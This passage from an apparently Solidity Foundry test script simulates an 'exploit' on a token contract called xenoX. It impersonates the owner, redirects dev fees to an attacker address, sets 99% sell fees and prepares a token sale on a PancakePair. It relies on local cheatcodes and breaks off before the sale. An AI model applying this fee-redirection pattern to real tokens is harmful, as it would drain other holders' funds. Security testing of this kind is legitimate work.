        // Let's assume the contract is already deployed and we're the owner
        // We'll just work with the existing TARGET address
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial token balance of attacker
        xenoX token = xenoX(TARGET);

        // First, we need to become the owner to set fees
        // In a real exploit, we'd impersonate the owner, but for local test,
        // let's assume we deploy the contract ourselves
        address tokenOwner = token.owner();

        // Impersonate owner to set fees
        vm.startPrank(tokenOwner);

        // Set dev address to attacker so dev fees go to us
        token.setdevAddress(payable(attacker));

        // Set extremely high sell fees
        token.setSellLiquidityFeePercent(99);
        token.setSelldevFeePercent(99);

        // Set sell tax to 0 to maximize other fees
        token.setSellTaxFeePercent(0);

        vm.stopPrank();

        // Get some tokens to sell - transfer from owner to attacker
        uint256 initialTokens = 1000000 * 10 ** 9; // 1M tokens
        vm.prank(tokenOwner);
        token.transfer(attacker, initialTokens);

        // Check attacker token balance
        uint256 attackerTokensBefore = token.balanceOf(attacker);
        require(attackerTokensBefore == initialTokens, "Didn't receive tokens");

        // Get the PancakePair address
        address pair = token.pancakePair();

        // Approve pair to spend tokens (simulating sell approval)
        vm.prank(attacker);
        token.approve(pair, attackerTokensBefore);

